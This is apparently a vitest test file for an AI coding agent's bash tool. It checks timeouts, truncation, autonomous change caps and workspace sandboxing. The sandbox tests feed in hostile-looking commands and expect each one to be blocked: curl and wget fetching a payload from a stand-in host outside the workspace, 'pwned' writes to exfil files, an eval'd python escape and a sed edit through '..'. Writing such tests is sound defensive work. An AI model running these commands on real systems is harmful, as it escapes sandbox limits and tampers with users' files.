import { describe, expect, test } from "vitest"
import fs from "fs/promises"
import path from "path"
import { BashTool } from "../../src/tool/bash"
import { Instance } from "../../src/project/instance"
import { Filesystem } from "../../src/util/filesystem"
import { tmpdir } from "../fixture/fixture"
import type { Permission } from "../../src/permission"
import { Truncate } from "../../src/tool/truncate"
import { Isolation } from "../../src/isolation"
import { SessionID, MessageID } from "../../src/session/schema"
import { BlastRadius } from "../../src/session/blast-radius"

const ctx = {
  sessionID: SessionID.make("ses_test"),
  messageID: MessageID.make(""),
  callID: "",
  agent: "build",
  abort: AbortSignal.any([]),
  messages: [],
  metadata: () => {},
  ask: async (_req?: PermissionRequest) => {},
}

const projectRoot = path.join(__dirname, "../..")

function shellQuote(value: string) {
  return `'${value.replaceAll("'", "'\\''")}'`
}

async function withAutonomous<T>(fn: () => Promise<T>): Promise<T> {
  const original = process.env.AX_CODE_AUTONOMOUS
  process.env.AX_CODE_AUTONOMOUS = "true"
  try {
    return await fn()
  } finally {
    if (original === undefined) delete process.env.AX_CODE_AUTONOMOUS
    else process.env.AX_CODE_AUTONOMOUS = original
  }
}

type PermissionRequest = Omit<Permission.Request, "id" | "sessionID" | "tool">

describe("tool.bash", () => {
  test("basic", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const result = await bash.execute(
          {
            command: "echo 'test'",
            description: "Echo test message",
          },
          ctx,
        )
        expect(result.metadata.exit).toBe(0)
        expect(result.metadata.output).toContain("test")
      },
    })
  })

  test("returns structured hang metadata on timeout", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const command = `"${process.execPath}" -e "setTimeout(() => {}, 1000)"`
        const result = await bash.execute(
          {
            command,
            timeout: "50" as any,
            description: "Wait past timeout",
          },
          ctx,
        )
        const hang = result.metadata.hang as Record<string, unknown>
        expect(hang["timedOut"]).toBe(true)
        expect(hang["timeoutMs"]).toBe(50)
        expect(hang["processId"]).toBeTypeOf("number")
        expect(hang["killStartedAt"]).toBeTypeOf("number")
        expect(result.output).toContain("bash tool terminated command after exceeding timeout 50 ms")
      },
    })
  })

  test("swallows metadata publish failures from stream callbacks", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        let metadataCalls = 0
        const noisyCtx = {
          ...ctx,
          metadata: () => {
            metadataCalls++
            throw new Error("metadata transport closed")
          },
        }
        const result = await bash.execute(
          {
            command: "echo 'test'",
            description: "Echo test message",
          },
          noisyCtx,
        )
        expect(metadataCalls).toBeGreaterThan(0)
        expect(result.metadata.exit).toBe(0)
        expect(result.metadata.output).toContain("test")
      },
    })
  })
})

describe("tool.bash permissions", () => {
  test("does not ask for bash permission when command is cd only", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const requests: PermissionRequest[] = []
        await bash.execute(
          {
            command: "cd .",
            description: "Stay in current directory",
          },
          {
            ...ctx,
            ask: async (req: PermissionRequest) => {
              requests.push(req)
            },
          },
        )
        const bashReq = requests.find((r) => r.permission === "bash")
        expect(bashReq).toBeUndefined()
      },
    })
  })
})

describe("tool.bash truncation", () => {
  test("binary cp does not consume the autonomous line cap", async () => {
    await using tmp = await tmpdir({ git: true })
    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_blast_binary_cp")
      BlastRadius.reset(sessionID)
      try {
        BlastRadius.applyConfigCaps(sessionID, { lines: 5, files: 100 })
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()
            const source = path.join(tmp.path, "sdluatex")
            const dest = path.join(tmp.path, "copied")
            await fs.writeFile(source, Buffer.concat([Buffer.from("ELF"), Buffer.alloc(997, 0)]))

            const result = await bash.execute(
              {
                command: `cp ${shellQuote(source)} ${shellQuote(dest)}`,
                description: "Copy extensionless binary",
              },
              { ...ctx, sessionID },
            )

            expect(result.metadata.exit).toBe(0)
            const state = BlastRadius.get(sessionID)
            expect(state.lines).toBe(0)
            expect(state.files.size).toBe(1)
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test("binary cp still participates in autonomous file-cap accounting", async () => {
    await using tmp = await tmpdir({ git: true })
    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_blast_binary_file_cap")
      BlastRadius.reset(sessionID)
      try {
        BlastRadius.applyConfigCaps(sessionID, { lines: 5, files: 0 })
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()
            const source = path.join(tmp.path, "sdluatex")
            const dest = path.join(tmp.path, "copied")
            await fs.writeFile(source, Buffer.concat([Buffer.from("ELF"), Buffer.alloc(997, 0)]))

            await expect(
              bash.execute(
                {
                  command: `cp ${shellQuote(source)} ${shellQuote(dest)}`,
                  description: "Copy extensionless binary under file cap",
                },
                { ...ctx, sessionID },
              ),
            ).rejects.toMatchObject({
              data: { message: expect.stringContaining("Autonomous file-change cap reached") },
            })
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test("redirect blast radius uses file-size estimate instead of one line per file", async () => {
    await using tmp = await tmpdir({ git: true })
    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_blast_estimate")
      BlastRadius.reset(sessionID)
      try {
        BlastRadius.applyConfigCaps(sessionID, { lines: 5 })
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()
            const target = path.join(tmp.path, "large.txt")
            const script = "process.stdout.write('x'.repeat(1000))"
            let caught: unknown

            try {
              await bash.execute(
                {
                  command: `${shellQuote(process.execPath)} -e ${shellQuote(script)} > ${shellQuote(target)}`,
                  description: "Write large redirected file",
                },
                { ...ctx, sessionID },
              )
            } catch (error) {
              caught = error
            }

            expect(caught).toBeInstanceOf(Error)
            expect((caught as { data?: { message?: string } }).data?.message).toContain(
              "Autonomous line-change cap reached",
            )
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test("redirect blast radius ignores timeout-killed commands", async () => {
    await using tmp = await tmpdir({ git: true })
    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_blast_timeout")
      BlastRadius.reset(sessionID)
      try {
        BlastRadius.applyConfigCaps(sessionID, { lines: 5 })
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()
            const target = path.join(tmp.path, "large.txt")
            const script = "process.stdout.write('x'.repeat(1000)); setTimeout(() => {}, 1000)"
            const result = await bash.execute(
              {
                command: `${shellQuote(process.execPath)} -e ${shellQuote(script)} > ${shellQuote(target)}`,
                timeout: 1,
                description: "Timeout redirected writer",
              },
              { ...ctx, sessionID },
            )

            expect((result.metadata.hang as Record<string, unknown>)["timedOut"]).toBe(true)
            expect(result.output).toContain("bash tool terminated command after exceeding timeout 1 ms")
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test("redirect blast radius surfaces inaccessible output files", async () => {
    if (process.platform === "win32") return

    await using tmp = await tmpdir({ git: true })
    const locked = path.join(tmp.path, "locked")
    await fs.mkdir(locked, { recursive: true })

    try {
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const script = "chmod 000 locked"

          await expect(
            bash.execute(
              {
                command: `sh -c ${shellQuote(script)} > locked/out.txt`,
                description: "Write and lock redirected file",
              },
              ctx,
            ),
          ).rejects.toMatchObject({ code: "EACCES" })
        },
      })
    } finally {
      await fs.chmod(locked, 0o700).catch(() => {})
    }
  })

  test("redirect blast radius treats ENOTDIR output stats as missing", async () => {
    await using tmp = await tmpdir({ git: true })
    const dir = path.join(tmp.path, "target")
    const output = path.join(dir, "out.txt")
    await fs.mkdir(dir, { recursive: true })

    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_redirect_enotdir")
      BlastRadius.reset(sessionID)
      try {
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()
            const script = [
              "const fs = require('fs')",
              `fs.rmSync(${JSON.stringify(output)})`,
              `fs.rmdirSync(${JSON.stringify(dir)})`,
              `fs.writeFileSync(${JSON.stringify(dir)}, 'not a directory')`,
            ].join(";")

            const result = await bash.execute(
              {
                command: `${shellQuote(process.execPath)} -e ${shellQuote(script)} > ${shellQuote(output)}`,
                description: "Replace redirect parent with file",
              },
              { ...ctx, sessionID },
            )

            expect(result.metadata.exit).toBe(0)
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test("input redirect is not treated as an autonomous write", async () => {
    await using tmp = await tmpdir({
      git: true,
      init: async (dir) => {
        await fs.writeFile(path.join(dir, ".env"), "SECRET=ok\n")
      },
    })
    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_input_redirect")
      BlastRadius.reset(sessionID)
      try {
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()
            const result = await bash.execute(
              {
                command: "cat < .env",
                description: "Read dotenv via input redirect",
              },
              { ...ctx, sessionID },
            )

            expect(result.metadata.exit).toBe(0)
            expect(result.output).toContain("SECRET=ok")
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test("inner shell write redirect counts against autonomous blast radius", async () => {
    await using tmp = await tmpdir({ git: true })
    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_inner_redirect_write")
      BlastRadius.reset(sessionID)
      try {
        BlastRadius.applyConfigCaps(sessionID, { files: 0 })
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()

            await expect(
              bash.execute(
                {
                  command: `sh -c ${shellQuote("printf x > inner.txt")}`,
                  description: "Write via inner shell redirect",
                },
                { ...ctx, sessionID },
              ),
            ).rejects.toMatchObject({
              data: { message: expect.stringContaining("Autonomous file-change cap reached") },
            })
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test("truncates output exceeding line limit", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const lineCount = Truncate.MAX_LINES + 500
        const result = await bash.execute(
          {
            command: `seq 1 ${lineCount}`,
            description: "Generate lines exceeding limit",
          },
          ctx,
        )
        expect((result.metadata as any).truncated).toBe(true)
        expect((result.metadata as any).originalSize).toBeGreaterThan(0)
        expect((result.metadata as any).truncatedTo).toBeGreaterThan(0)
        expect((result.metadata as any).contentHint).toBeTypeOf("string")
        expect((result.metadata as any).fullOutputPath).toBe((result.metadata as any).outputPath)
        expect(result.output).toContain("truncated")
        expect(result.output).toContain("The tool call succeeded but the output was truncated")
      },
    })
  })

  test("truncates output exceeding byte limit", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const byteCount = Truncate.MAX_BYTES + 10000
        const result = await bash.execute(
          {
            command: `head -c ${byteCount} /dev/zero | tr '\\0' 'a'`,
            description: "Generate bytes exceeding limit",
          },
          ctx,
        )
        expect((result.metadata as any).truncated).toBe(true)
        expect(result.output).toContain("truncated")
        expect(result.output).toContain("The tool call succeeded but the output was truncated")
      },
    })
  })

  test("does not truncate small output", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const result = await bash.execute(
          {
            command: "echo hello",
            description: "Echo hello",
          },
          ctx,
        )
        expect((result.metadata as any).truncated).toBe(false)
        expect(result.output).toMatch(/^hello\r?\n$/)
      },
    })
  })

  test("full output is saved to file when truncated", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const lineCount = Truncate.MAX_LINES + 100
        const result = await bash.execute(
          {
            command: `seq 1 ${lineCount}`,
            description: "Generate lines for file check",
          },
          ctx,
        )
        expect((result.metadata as any).truncated).toBe(true)

        const filepath = (result.metadata as any).outputPath
        expect(filepath).toBeTruthy()

        const saved = await Filesystem.readText(filepath)
        const lines = saved.trim().split("\n")
        expect(lines.length).toBe(lineCount)
        expect(lines[0]).toBe("1")
        expect(lines[lineCount - 1]).toBe(String(lineCount))
      },
    })
  })
})

describe("tool.bash isolation", () => {
  test("rejects redirection target outside workspace in workspace-write mode", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }
        const outsideFile = path.join(outerTmp.path, "exfil.txt")
        // The redirect target is outside the workspace; even though
        // `echo` itself is harmless, writing the output anywhere on disk
        // must be sandboxed.
        await expect(
          bash.execute(
            {
              command: `echo pwned > ${outsideFile}`,
              description: "Attempt redirect outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
      },
    })
  })

  test("rejects redirection target inside `bash -c` inner command", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }
        const outsideFile = path.join(outerTmp.path, "exfil.txt")
        // The redirect lives inside the quoted `-c` argument and is
        // parsed by the inner tree-sitter pass; outer file_redirect
        // walking misses it.
        await expect(
          bash.execute(
            {
              command: `bash -c "echo pwned > ${outsideFile}"`,
              description: "Attempt redirect outside workspace via bash -c",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
      },
    })
  })

  test("rejects curl output target inside `bash -c` inner command", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }
        const outsideFile = path.join(outerTmp.path, "payload.txt")
        await expect(
          bash.execute(
            {
              command: `bash -c "curl -o ${outsideFile} https://example.invalid/payload"`,
              description: "Attempt curl outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
      },
    })
  })

  test("rejects wget -O output target outside workspace", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }
        const outsideFile = path.join(outerTmp.path, "payload.txt")
        await expect(
          bash.execute(
            {
              command: `wget -O ${outsideFile} https://example.invalid/payload`,
              description: "Attempt wget outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
      },
    })
  })

  test("rejects interpreter inline absolute path inside `eval`", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }
        const outsideFile = path.join(outerTmp.path, "inline.txt")
        await expect(
          bash.execute(
            {
              command: `eval "python3 -c 'open(\\\"${outsideFile}\\\", \\\"w\\\").write(\\\"x\\\")'"`,
              description: "Attempt python outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
      },
    })
  })

  test("rejects dynamic command substitution redirection target", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }

        await expect(
          bash.execute(
            {
              command: "echo pwned > $(echo /tmp/exfil.txt)",
              description: "Attempt dynamic redirect",
            },
            testCtx,
          ),
        ).rejects.toThrow(/Dynamic redirection targets/)
      },
    })
  })

  test("rejects dynamic command substitution redirection target inside `bash -c`", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }

        await expect(
          bash.execute(
            {
              command: 'bash -c "echo pwned > $(echo /tmp/exfil.txt)"',
              description: "Attempt inner dynamic redirect",
            },
            testCtx,
          ),
        ).rejects.toThrow(/Dynamic redirection targets/)
      },
    })
  })

  test("rejects relative `..` escape via an unmodeled command (sed -i)", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    const victim = path.join(outerTmp.path, "victim.txt")
    await fs.writeFile(victim, "original\n")
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = { ...ctx, ask: async () => {}, extra: { isolation } }
        const rel = path.relative(tmp.path, victim)
        // `sed` is not in the modeled-command list. A relative `..` path must
        // still be checked against the workspace boundary, otherwise an
        // in-place edit silently mutates a file outside the workspace.
        await expect(
          bash.execute({ command: `sed -i '' 's/original/PWNED/' ${rel}`, description: "Escape via sed" }, testCtx),
        ).rejects.toThrow(/outside workspace boundary|protected/)
        expect(await fs.readFile(victim, "utf8")).toBe("original\n")
      },
    })
  })

  test("allows in-workspace barewords that are not paths", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = { ...ctx, ask: async () => {}, extra: { isolation } }
        // Regression guard: tightening the relative-path check must not flag
        // harmless barewords/subcommands that resolve inside the workspace.
        const result = await bash.execute({ command: `git status --short`, description: "git status" }, testCtx)
        expect(result.metadata.exit).toBe(0)
      },
    })
  })

  test("blocks network-only commands when network is disabled", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = { ...ctx, ask: async () => {}, extra: { isolation } }
        // `curl --version` reaches no path outside the workspace, so the path
        // checks pass — the network guard is what must block it.
        await expect(
          bash.execute({ command: `curl --version`, description: "probe network" }, testCtx),
        ).rejects.toThrow(/Network access is disabled/)
        // Same vector hidden inside `bash -c`.
        await expect(
          bash.execute({ command: `bash -c "wget --version"`, description: "probe network" }, testCtx),
        ).rejects.toThrow(/Network access is disabled/)
      },
    })
  })

  test("allows network-only commands when network is enabled", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: true }, tmp.path, tmp.path)
        const testCtx = { ...ctx, ask: async () => {}, extra: { isolation } }
        const result = await bash.execute({ command: `curl --version`, description: "curl version" }, testCtx)
        expect(result.metadata.exit).toBe(0)
      },
    })
  })

  describe("path existence pre-validation", () => {
    test("rejects cd to non-existent directory", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(
            bash.execute(
              {
                command: "cd /nonexistent/path/that/does/not/exist",
                description: "Change to non-existent dir",
              },
              ctx,
            ),
          ).rejects.toThrow(/Path does not exist/)
        },
      })
    })

    test("rejects cat on non-existent file", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(
            bash.execute(
              {
                command: "cat nonexistent.txt",
                description: "Cat non-existent file",
              },
              ctx,
            ),
          ).rejects.toThrow(/Path does not exist/)
        },
      })
    })

    test("rejects mv from non-existent file", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(
            bash.execute(
              {
                command: "mv nonexistent.txt moved.txt",
                description: "Move non-existent file",
              },
              ctx,
            ),
          ).rejects.toThrow(/Path does not exist/)
        },
      })
    })

    test("rejects missing literal dash-prefixed rm target after option separator", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(
            bash.execute(
              {
                command: "rm -- -f",
                description: "Remove literal dash-prefixed file",
              },
              ctx,
            ),
          ).rejects.toThrow(/Path does not exist/)
        },
      })
    })

    test("allows existing literal dash-prefixed rm target after option separator", async () => {
      await using tmp = await tmpdir()
      const filepath = path.join(tmp.path, "-f")
      await fs.writeFile(filepath, "literal flag filename")
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: "rm -- -f",
              description: "Remove existing literal dash-prefixed file",
            },
            ctx,
          )

          expect(result.metadata.exit).toBe(0)
          expect(await Filesystem.exists(filepath)).toBe(false)
        },
      })
    })

    test("allows ls on existing directory", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: `ls ${tmp.path}`,
              description: "List existing directory",
            },
            ctx,
          )
          expect(result.metadata.exit).toBe(0)
        },
      })
    })

    test("allows cat on existing file", async () => {
      await using tmp = await tmpdir()
      const filepath = path.join(tmp.path, "existing.txt")
      await fs.writeFile(filepath, "hello")
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: `cat ${filepath}`,
              description: "Cat existing file",
            },
            ctx,
          )
          expect(result.metadata.exit).toBe(0)
          expect(result.output).toContain("hello")
        },
      })
    })

    test("allows a compound command to create paths before reading them", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: [
                "cat > prompt.txt <<'EOF'",
                "nested model prompt",
                "EOF",
                "cp prompt.txt copied.txt",
                "printf '%s' \"$(cat copied.txt)\"",
              ].join("\n"),
              description: "Create and read a nested prompt",
            },
            ctx,
          )

          expect(result.metadata.exit).toBe(0)
          expect(result.output).toContain("nested model prompt")
        },
      })
    })

    test("still rejects a read that appears before its creator", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(
            bash.execute(
              {
                command: "cat late.txt; touch late.txt",
                description: "Read before creating a file",
              },
              ctx,
            ),
          ).rejects.toThrow(/Path does not exist/)
        },
      })
    })

    test("error message includes hint about Glob tool", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          try {
            await bash.execute(
              {
                command: "cat /nonexistent/file.txt",
                description: "Cat non-existent file",
              },
              ctx,
            )
            throw new Error("should have thrown")
          } catch (err) {
            const msg = err instanceof Error ? err.message : String(err)
            expect(msg).toContain("Glob")
            expect(msg).toContain("Hint:")
          }
        },
      })
    })

    test("does not treat grep pattern as a path", async () => {
      await using tmp = await tmpdir()
      const filepath = path.join(tmp.path, "existing.txt")
      await fs.writeFile(filepath, "hello\n")
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: "grep hello existing.txt",
              description: "Grep existing file",
            },
            ctx,
          )
          expect(result.metadata.exit).toBe(0)
          expect(result.output).toContain("hello")
        },
      })
    })

    test("allows mv to a new destination when source exists", async () => {
      await using tmp = await tmpdir()
      await fs.writeFile(path.join(tmp.path, "source.txt"), "hello")
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: "mv source.txt renamed.txt",
              description: "Rename existing file",
            },
            ctx,
          )
          expect(result.metadata.exit).toBe(0)
          expect(await Filesystem.exists(path.join(tmp.path, "renamed.txt"))).toBe(true)
        },
      })
    })
  })
})
